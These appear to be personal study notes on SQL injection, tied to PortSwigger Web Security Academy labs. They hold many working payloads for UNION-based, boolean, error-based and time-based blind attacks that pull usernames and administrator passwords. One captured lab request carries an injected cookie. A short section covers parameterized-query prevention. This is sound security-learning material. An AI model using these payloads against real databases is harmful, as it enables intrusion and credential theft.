https://portswigger.net/web-security/sql-injection
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100

https://portswigger.net/web-security/sql-injection/examining-the-database

---

Example of a Vulnerable URL:
```http
https://example.com/product.php?id=10
```
If the backend query is written insecurely like this:
```sql
SELECT * FROM products WHERE id = '$id';
```


Basic SQL Injection in URL:
```http
https://example.com/product.php?id=10 OR 1=1
```
If the backend query is:
```sql
SELECT * FROM products WHERE id = '10 OR 1=1';
```
So
```http
https://example.com/product.php?id=10'+OR+1=1--
```
The backend query is:
```sql
SELECT * FROM products WHERE id = '10' OR 1=1;
```
**Effect:** This query will return **all products** instead of just one.


Comment in SQL:
```http
https://example.com/login.php?user=admin'--
```
Will cause:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'password';
```


Finding Database Version:
```http
https://example.com/product.php?id=10 UNION SELECT @@version, null
```


---
# Out-of-Band Application Security Testing

OAST (Out-of-Band Application Security Testing) payloads are **special payloads used in security testing** to detect vulnerabilities that may not be visible in the immediate response but trigger an **out-of-band (OOB) interaction**. 

These payloads force the target application to make an external request to an attacker's controlled server.

### **How OAST Works**
1. **Tester injects an OAST payload** (e.g., into a web form, HTTP headers, or file uploads).
2. **Vulnerable application processes the input** and unintentionally triggers an outbound request.
3. **The attacker's server logs the request**, confirming the vulnerability.


---
# Examining the database
After you identify a SQL injection vulnerability, it's often useful to obtain information about the database. 

This information can help you to exploit the vulnerability.

```sql
SELECT * FROM v$version
SELECT * FROM information_schema.tables
```

|                  |                           |
| ---------------- | ------------------------- |
| Database type    | Query                     |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. 
If your `UNION SELECT` attack does not query from a table, ==**you will still need to include the**== `FROM` keyword followed by a valid table name.
There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

more in: https://portswigger.net/web-security/sql-injection/examining-the-database

---
![[Screenshot from 2025-02-27 11-45-52.png]]

---
# Retrieving data from other tables

**Retrieving data from other database tables**:
```sql
SELECT name, description FROM products WHERE category = 'Gifts' 
```
Use `UNION`:
```sql
UNION SELECT username, password FROM users--
```


----
## How to prevent SQL injection

```js
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

```js
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```
You can use parameterized queries for any situation where untrusted input appears as data within the query, including the `WHERE` clause and values in an `INSERT` or `UPDATE` statement. 
==They **can't** be used to handle untrusted input in other parts of the query==, such as table or column names, or the `ORDER BY` clause.


--- 
# Union query

For a `UNION` query to work, two key requirements must be met:
- The individual queries must return the **same** number of columns.
- The data types in each column must be compatible between the individual queries.

**Determining the number of columns required**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
Or
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
We use `NULL` as the values returned from the injected `SELECT` query because the data types in each column must be compatible between the original and the injected queries.
`NULL` is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.


After you determine the number of required columns, you can probe each column to test whether it can hold string data.
```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

---
# Database contents

|            |                                                                                                                              |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT * FROM all_tables`  `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                             |
| Microsoft  | `SELECT * FROM information_schema.tables`   `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`  |
| PostgreSQL | `SELECT * FROM information_schema.tables`   `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`  |
| MySQL      | `SELECT * FROM information_schema.tables`    `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |


In oracle:
```sql
union select table_name, null from all_tables -- comment
```

```sql
union 
	select column_name, null from all_tab_columns 
	WHERE table_name = 'USERS_CDVOGL' -- comment
```

```sql
union select EMAIL, PASSWORD_VWKEJW from USERS_CDVOGL -- comment
```

```sql
union select EMAIL || ' - ' || PASSWORD_VWKEJW, null from USERS_CDVOGL -- comment
```


Add `'` then:
```sql
UNION SELECT table_name, null from information_schema.tables --
```

```sql
UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users_xsczud' --
```

```sql
UNION SELECT username_ymbmft, password_lhhwcx FROM users_xsczud --
```



---
# Blind SQL injection

```sql
union select TrackingId from TrackedUsers where TrackingId='lCSKT8rw3yobgjYe' -- comment 
```

```sql
GET /filter?category=Gifts HTTP/2
Host: 0a7b006304a8c1d381702a8200090064.web-security-academy.net
Cookie: TrackingId=lCSKT8rw3yobgjYe' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) = 20) = 'a' --; session=GJsvRLj72NZOVHi3Yen9Q2Egv8gVAyim

```

![[Pasted image 20250303104018.png]]



### Exploiting blind SQL injection by triggering conditional errors

```sql
AND CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator') = 1 THEN 1 ELSE 1/0 END = 1
```
The Final Condition (`= 1`)
This **compares the output of the `CASE`** statement with **1**.

```sql
AND CASE WHEN (SELECT INSTR(password, 'c') FROM users WHERE username='administrator') = 2 THEN 1/0 ELSE 1 END = 1 --
```


```sql
AND CASE WHEN (SELECT SUBSTR(password, 1, 1) FROM users WHERE username='administrator') = 'a' THEN 1/0 ELSE 1	 END = 1  --
```



### Extracting sensitive data via verbose SQL error messages

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

```sql
AND CAST((SELECT password FROM users LIMIT 1) AS int)=1-- 0
```


### Exploiting blind SQL injection by triggering time delays
The techniques for triggering a time delay are specific to the type of database being used. 

For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

Using this technique, we can retrieve data by testing one character at a time:
```sql
IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

```
(SELECT pg_sleep(10))
```

```sql
database type: PostgreSQL

|| (SELECT CASE WHEN (SELECT length(password) FROM users WHERE username='administrator') = 20  THEN pg_sleep(10) ELSE pg_sleep(0) END) --


password length: 20

|| (SELECT CASE WHEN (SELECT SUBSTRING(password FROM 1 FOR 1) FROM users WHERE username='administrator') = '{paylaod}'  THEN pg_sleep(10) ELSE pg_sleep(0) END) --

; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1) ='a')THEN pg_sleep(10) ELSE pg_sleep(0)END FROM users

```

```sql
SELECT SUBSTRING('Hello, World!' FROM 8 FOR 5);
```
`PostgreSQL` is 1 based indexing will take the `for` value starting including the `from` value.


